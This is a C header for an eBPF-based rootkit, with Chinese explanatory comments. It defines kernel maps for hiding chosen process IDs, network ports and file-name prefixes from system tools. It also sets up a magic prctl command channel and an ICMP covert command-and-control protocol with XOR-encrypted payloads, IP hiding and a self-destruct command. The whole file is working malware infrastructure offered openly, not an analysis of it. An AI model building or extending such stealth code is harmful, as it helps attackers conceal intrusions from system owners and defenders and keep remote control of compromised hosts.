/*
 * stealth.bpf.h - 公共定义：所有 map、常量、结构体、工具函数
 *
 * 被 control.bpf.h 和 stealth.bpf.c 共同 include
 * 所有函数必须声明为 static，避免多次 include 时产生符号重复定义错误
 */
#pragma once

/*
 * 调试日志宏：通过编译时 -DDEBUG 开启，输出到 /sys/kernel/debug/tracing/trace_pipe
 * 查看：cat /sys/kernel/debug/tracing/trace_pipe
 * 关闭：重新编译时不传 -DDEBUG（make bpf）
 * 开启：make bpf DEBUG=1
 */
#ifdef DEBUG
#define DBG_PRINT(fmt, ...)  bpf_printk("[stealth] " fmt, ##__VA_ARGS__)
#else
#define DBG_PRINT(fmt, ...)  /* disabled */
#endif

/*
 * 通过 prctl 系统调用下发命令的魔数，用于区分普通 prctl 调用
 * 用户空间调用 prctl(0x564C, cmd, arg, ...) 即可向 eBPF 程序发送指令
 */
#define PRCTL_MAGIC          0x564C
#define PRCTL_CMD_HIDE_PID   0x01  /* 隐藏指定 PID */
#define PRCTL_CMD_HIDE_PORT  0x02  /* 隐藏指定端口 */
#define PRCTL_CMD_HIDE_FILE  0x03  /* 隐藏指定文件名前缀 */
#define PRCTL_CMD_STEALTH    0x06  /* 开启/关闭隐藏功能（1=开启，0=关闭）*/
#define PRCTL_CMD_CLEAR      0xFF  /* 清除所有隐藏规则 */

#define MAX_PIDS      64
#define MAX_PORTS     64
#define MAX_PREFIXES  32
#define PREFIX_MAXLEN 64

/* ICMP C2 命令码（与 LKM 版本对齐）*/
#define ICMP_MAGIC           0xC0DE  /* ICMP Echo id 字段魔数 */
#define ICMP_KEY_DEFAULT     0x42    /* 默认 XOR 加密密钥 */
#define ICMP_DATA_MAX        62      /* payload data 字段最大长度 */
#define ICMP_CMD_HIDE_PID    0x01
#define ICMP_CMD_HIDE_PORT   0x02
#define ICMP_CMD_HIDE_FILE   0x03
#define ICMP_CMD_STEALTH     0x06
#define ICMP_CMD_HIDE_IP     0x12
#define ICMP_CMD_HIDE_IPPORT 0x13
#define ICMP_CMD_SET_KEY     0x20
#define ICMP_CMD_SELF_DESTRUCT 0xFE
#define ICMP_CMD_CLEAR       0xFF

/*
 * ICMP payload 格式（紧跟 ICMP header 之后）：
 *   byte 0   : cmd  - 命令码
 *   byte 1   : len  - data 字段有效字节数
 *   byte 2.. : data - 参数，用 icmp_key XOR 加密
 */
struct icmp_cmd {
    __u8 cmd;
    __u8 len;
    __u8 data[ICMP_DATA_MAX];
} __attribute__((packed));

/*
 * ICMP C2 配置 map（单元素 array）
 *   index 0: icmp_magic (u16) - ICMP echo id 魔数
 *   index 1: icmp_key   (u8)  - XOR 加密密钥
 * 用两个独立的 map 是因为类型不同，不能放同一个 array 里
 */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u16);
} icmp_magic SEC(".maps");

struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u8);
} icmp_key SEC(".maps");

/* netlink 相关常量 */
#define SOCK_DIAG_BY_FAMILY 20
#define NLMSG_HDRLEN        16
#define NLMSG_ALIGN(len)    (((len) + 3) & ~3)

/*
 * eBPF Map（映射表）是 eBPF 程序与用户空间共享数据的核心机制
 * 内核态（eBPF）和用户态（loader）都可以读写同一个 map
 *
 * BPF_MAP_TYPE_HASH:  哈希表，O(1) 查找，key 可以是任意值，支持动态增删
 * BPF_MAP_TYPE_ARRAY: 数组，key 必须是 0~max_entries-1 的整数，适合单个全局变量
 *
 * SEC(".maps") 告诉 libbpf 这是一个 map 定义，加载时会自动在内核中创建
 */

/*
 * 存储要隐藏的 PID 集合，key=PID(u32)，value=标记位(u8，1表示需要隐藏)
 * max_entries=MAX_PIDS=64，即最多同时隐藏 64 个 PID
 * 如需隐藏更多，调大 MAX_PIDS 并重新编译即可
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_PIDS);
    __type(key, __u32);
    __type(value, __u8);
} hidden_pids SEC(".maps");

/* 存储要隐藏的端口集合，key=端口号(u16)，value=标记位 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_PORTS);
    __type(key, __u16);
    __type(value, __u8);
} hidden_ports SEC(".maps");

/*
 * 存储要隐藏的文件名前缀，key=前缀的哈希值(u32)，value=标记位
 * 用哈希而不是字符串作为 key，是因为 eBPF map 的 key 长度必须固定
 */
struct {
    __uint(type, BPF_MAP_TYPE_HASH);
    __uint(max_entries, MAX_PREFIXES);
    __type(key, __u32);
    __type(value, __u8);
} hidden_prefixes SEC(".maps");

/*
 * 全局开关，控制隐藏功能是否启用
 * 使用 BPF_MAP_TYPE_ARRAY 而非 HASH，因为只有一个元素（key=0），访问更高效
 */
struct {
    __uint(type, BPF_MAP_TYPE_ARRAY);
    __uint(max_entries, 1);
    __type(key, __u32);
    __type(value, __u8);
} stealth_state SEC(".maps");

/*
 * 取文件名前 3 个字符计算简单哈希，用于 hidden_prefixes map 的 key
 * eBPF 中 static 函数会被内联到调用处，不产生函数调用开销
 */
static __u32 hash_prefix(const char *p, int len) {
    __u32 h = 0;
    /*
     * #pragma unroll 告诉编译器将此循环展开为直线代码
     * eBPF verifier 对循环有严格限制，展开后 verifier 更容易通过验证
     */
    #pragma unroll
    for (int i = 0; i < 3 && i < len; i++) {
        if (p[i])
            h = h * 31 + p[i];
    }
    return h;
}

/* 检查文件名是否匹配任意一个隐藏前缀 */
static bool is_prefix_hidden(const char *name, int len) {
    __u32 h = hash_prefix(name, len);
    /*
     * bpf_map_lookup_elem: eBPF 辅助函数，在 map 中查找 key 对应的 value
     * 返回指向 value 的指针，找不到返回 NULL
     * 注意：不能直接解引用可能为 NULL 的指针，verifier 会拒绝
     */
    __u8 *found = bpf_map_lookup_elem(&hidden_prefixes, &h);
    return found != NULL;
}
